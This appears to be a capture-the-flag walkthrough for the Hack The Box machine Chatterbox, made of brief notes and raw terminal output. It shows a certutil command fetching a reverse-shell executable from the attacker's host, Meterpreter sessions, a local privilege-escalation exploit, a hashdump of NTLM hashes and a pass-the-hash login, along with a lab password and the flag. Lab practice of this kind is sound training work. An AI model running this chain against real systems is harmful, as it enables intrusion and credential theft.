SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\administrator:Welcome1! (Pwn3d!)



certutil -urlcache -f http://10.10.14.7/shell.exe shell.exe

create a reverse shell using msfvenom and host it then copy it on the machineL
S C:\Users\Alfred\Desktop> certutil -urlcache -f http://10.10.14.7/shell.exe shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\Alfred\Desktop> dir


    Directory: C:\Users\Alfred\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          4/4/2023   4:03 PM      73802 shell.exe                         
-ar--          4/4/2023   3:12 PM         34 user.txt     


PS C:\Users\Alfred\Desktop> .\shell.exe
PS C:\Users\Alfred\Desktop> 


use msfconsole multi handler to get a shell:

payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.7:9001 
[*] Sending stage (175686 bytes) to 10.10.10.74
[*] Meterpreter session 1 opened (10.10.14.7:9001 -> 10.10.10.74:49166) at 2023-04-04 11:05:13 -0400

meterpreter >


use exploit suggester to get a list of exploits:

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search exploit suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.74 - Collecting local exploits for x86/windows...
[*] 10.10.10.74 - 173 exploit checks are being tried...
[+] 10.10.10.74 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.74 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.74 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.74 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.74 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.74 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.74 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.74 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.74 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.74 - Valid modules for session 1:


msf6 > use exploit/windows/local/ntusermndragover
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ntusermndragover) > show options

Module options (exploit/windows/local/ntusermndragover):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 x86


msf6 exploit(windows/local/ntusermndragover) > set session 1
session => 1
msf6 exploit(windows/local/ntusermndragover) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf6 exploit(windows/local/ntusermndragover) > set LPORT 1234
LPORT => 1234
msf6 exploit(windows/local/ntusermndragover) > run

[*] Started reverse TCP handler on 10.10.14.7:1234 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Reflectively injecting the exploit DLL and running the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 3740 launched.
[*] Reflectively injecting the DLL into 3740...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.74
[*] Meterpreter session 2 opened (10.10.14.7:1234 -> 10.10.10.74:49168) at 2023-04-04 11:09:32 -0400

meterpreter > pwd
C:\Users\Alfred\Desktop
meterpreter > cd ..
meterpreter > cd Administrator\Desktop
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd Administrator
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd ..
meterpreter > cd Administrator
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  282     fil   2017-12-10 18:08:47 -0500  desktop.ini
100777/rwxrwxrwx  678312  fil   2023-04-04 15:55:25 -0400  plink.exe
100444/r--r--r--  34      fil   2023-04-04 15:12:21 -0400  root.txt

meterpreter > cat root.txt
[-] core_channel_open: Operation failed: Access is denied.


notice that you cannot read the root.txt file.

C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator\Desktop

04/04/2023  03:55 PM    <DIR>          .
04/04/2023  03:55 PM    <DIR>          ..
04/04/2023  03:55 PM           678,312 plink.exe
04/04/2023  03:12 PM                34 root.txt
               2 File(s)        678,346 bytes
               2 Dir(s)   3,345,870,848 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.



now dump all the hashes:


meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9307ee5abf7791f3424d9d5148b20177:::
Alfred:1000:aad3b435b51404eeaad3b435b51404ee:9307ee5abf7791f3424d9d5148b20177:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 

now we use pth-winexe to log in as administrator and read the root flag.


kali㉿kali)-[~/Practice/HackTheBox/Chatterbox]
└─$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9307ee5abf7791f3424d9d5148b20177 //10.10.10.74 cmd.exe                                                                          1 ⨯
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>cd Users
cd Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator\Desktop

04/04/2023  03:55 PM    <DIR>          .
04/04/2023  03:55 PM    <DIR>          ..
04/04/2023  03:55 PM           678,312 plink.exe
04/04/2023  03:12 PM                34 root.txt
               2 File(s)        678,346 bytes
               2 Dir(s)   3,345,797,120 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
62016519b748586bfac46ea806a0c7ad

C:\Users\Administrator\Desktop>
